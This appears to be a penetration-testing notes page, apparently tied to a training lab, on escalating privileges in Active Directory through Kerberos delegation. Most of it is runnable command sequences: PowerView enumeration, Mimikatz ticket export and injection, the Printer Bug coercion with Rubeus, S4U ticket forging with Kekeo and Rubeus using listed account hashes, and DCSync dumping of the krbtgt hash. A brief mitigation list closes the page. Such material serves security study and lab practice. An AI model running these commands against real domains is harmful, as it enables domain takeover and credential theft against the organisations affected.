---
title: "Delegation Attacks"
description: "Privilege escalation using delegation attacks."
lead: "Using unconstrained and constrained delegation for privilege escalation in Active Directory with PowerView, Mimikatz, and Rubeus."
date: 2021-11-06T11:53:35+01:00
lastmod: 2021-11-06T11:53:35+01:00
draft: false
images: []
menu: 
  active_directory:
    parent: "domain_privilege_escalation"
weight: 30
toc: true
---

## Unconstrained Delegation

### General

- When set for service account, allows delegation to any service to any resource on the domain as a user
- When enabled, DC places user's TGT inside TGS when user requests access to service with unconstrained delegation enabled
- Server extracts TGT from TGS and stores it in LSASS
- Server can reuse the user's TGT to access resoruces
- Escalate privileges when extracting TGT from Domain Admins or other HVTs
- Note: need local admin access on the machine to extract tickets

### Exploitation

```powershell
# Get computers that have unconstrained delegation enabled
# Using PowerView
Get-NetComputer -Unconstrained

# Using AD Module
Get-ADComputer -Filter { TrustedForDelegation -eq $true }
Get-ADUser -Filter { TrustedForDelegation -eq $true }

# Monitor DA logins on computer
Invoke-UserHunter -ComputerName dcorp-appsrv -Poll 100 -UserName Administrator -Delay 5 -Verbose

# Check if we have local admin access on that machine using PowerView
Find-LocalAdminAccess -ComputerName dcorp-appsrv

# Get session on machine as local admin and check for tickets
Invoke-Mimikatz -Command '"sekurlsa::tickets"'

# Export tickets
Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'

# Inject ticket into session
Invoke-Mimikatz -Command '"kerberos:ptt ticket.kirbi"'
```

### Printer Bug

- Trick HVT to connect to machine with Unconstrained Delegation enabled
- Feature of MS-RPRN allows any domain user (Authenticated User) to force any machine (running the Spooler service) to connect to a second machine of the user's choice
- Force Domain Admin to connect to specific machine
- https://github.com/leechristensen/SpoolSample

```powershell
# Start capturing for TGTs using Rubeus
.\Rubeus.exe monitor /interval:5 /nowrap

# Run MS-RPRN.exe
.\MS-RPRN.exe \\dcorp-dc.dollarcorp.moneycorp.local \\dcorp-appserv.dollarcorp.moneycorp.local

# Copy base64 encoded TGT, remove extra spaces and inject it on attacker machine
.\Rubeus.exe ptt /ticket:ticket.kirbi

# Run DCSync
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```

## Constrained Delegation

### General

- When enabled on a service account, allows access only to specified services on specified computers as a user
- Typical scenario:
  - User authenticates to a web service without Kerberos
  - Web services makes requests to database server to fetch results based on the user's authorization
- To impersonate the user, Service for User (S4U) extension is used which provides two extensions

#### Service for User to Self (S4U2self) Extension

- Allows service to obtain a forwardable TGS to itself on behalf of a user
- Only needs the user principal name but NO PASSWORD
- Service account must have the `TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION` - T2A4D UserAccountControl attribute set

#### Service for User to Proxy (S4U2proxy) Extension

- Allows service to obtain a TGS to a second service on behalf of a user
- Uses the previously obtained TGS from S4U2self
- Only allows access to services listed in the `msDS-AllowedToDelegateTo` attribute
- Attribute contains list of SPNs to which the user tokens can be forwarded

### Example Scenario: Constrained Delegation with Protocol Transition

1. User (Joe) authenticates to web service running under `websvc` service account using non-Kerberos method
2. Web service requests ticket from KDC for Joe without supplying a password, as the websvc account
3. KDC checks the websvc userAccountControl value for TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION attribute
4. If set, KDC checks that Joe's account is not blocked for delegation
5. If OK, KDC returns forwardable ticket for Joe's account (S4U2self)
6. Service passes ticket back to the KDC and requests a TGS for the CIFS/dcorp-mssql.dollarcorp.moneycorp.local service
7. KDC checks the msDS-AllowedToDelegateTo field on the websvc account
8. If SPN is listed there, KDC return TGS for dcorp-mssql (S4U2proxy)
9. Web service can now authenticate to the CIFS on dcorp-mssql as Joe using the obtained TGS

### Exploitation

#### For Users with Constrained Delegation

- Requires access to the user/service account
- If we can access it, we can access all the listed services in msDS-AllowedToDelegateTo attribute
- Can access the services as ANY user

```powershell
# Enumerate users with constrained delegation enabled
# PowerView 3.0
Get-DomainUser -TrustedToAuth

# AD Module
Get-ADObject -Filter {msDS-AllowedToDelegateTo} -ne "$null"} -Properties msDS-AllowedToDelegateTo

# Kekeo
# Request TGT for websvc user
tgt::ask /domain:dollarcorp.moneycorp.local /user:websvc /rc4:cc098f204c5887eaa8253e7c2749156f

# Request TGS using s4u in Kekeo and supplying the requested TGT
# Impersonate the Administrator Domain Admin
# We gain access to the CIFS service
tgs::s4u /tgt:tgt.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:cifs/dcorp-mssql.dollarcorp.moneycorp.local

# Inject the ticket using mimikatz
Invoke-Mimikatz -Command '"kerberos::ptt tgs.kirbi"'

# We can do both steps at the same time using Rubeus
# Request TGT and TGS in a single command
.\Rubeus.exe s4u /user:websvc /rc4:cc098f204c5887eaa8253e7c2749156f /impersonateuser:Administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /ptt

# We can now access the CIFS service on dcorp-mssql as the dcorp\Administrator DA user
ls \\dcorp-mssql.dollarcorp.moneycorp.local\c$
```

#### For Computers with Constrained Delegation

- Delegation occurs not only for specific service
- Occurs for ANY service running under the same service account
- No validation for SPN specified
- Requires hash of the machine account of the computer running with constrained delegation

```powershell
# Enumerate computers with constrained delegation enabled
# PowerView 3.0
Get-DomainComputer -TrustedToAuth

# AD Module
Get-ADObject -Filter {msDS-AllowedToDelegateTo} -ne "$null"} -Properties msDS-AllowedToDelegateTo

# Kekeo
# Request TGT for machine account
tgt::ask /domain:dollarcorp.moneycorp.local /user:dcorp-adminsrv$ /rc4:5e77978a734e3a7f3895fb0fdbda3b96

# Using s4u, request TGS to access the LDAP service as the DA Adminstrator
tgs::s4u /tgt:tgt.kirbi /user:Administrator@dollarcorp.moneycorp.LOCAL /service:time/dcorp-dc.dollarcorp.moneycorp.local|ldap/dcorp-dc.dollarcorp.moneycorp.LOCAL

# Inject ticket into memory with Mimikatz
Invoke-Mimikatz -Command '"kerberos::ptt tgs.kirbi"'

# Request TGS and TGT at the same time with Rubeus
.\Rubeus.exe s4u /user:dcorp-adminsrv$ /rc4:5e77978a734e3a7f3895fb0fdbda3b96 /impersonateuser:Administrator /msdsspn:"time/dcorp-dc.dollarcorp.moneycorp.local" /altservice:ldap /ptt

# Execute DCSync attack with new permissions
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```

## Mitigation

- Limit DA/Admin logins to specific servers
- Set "Account is sensitive and cannot be delegated" for privileged accounts
- https://docs.microsoft.com/en-us/archive/blogs/poshchap/security-focus-analysing-account-is-sensitive-and-cannot-be-delegated-for-privileged-accounts
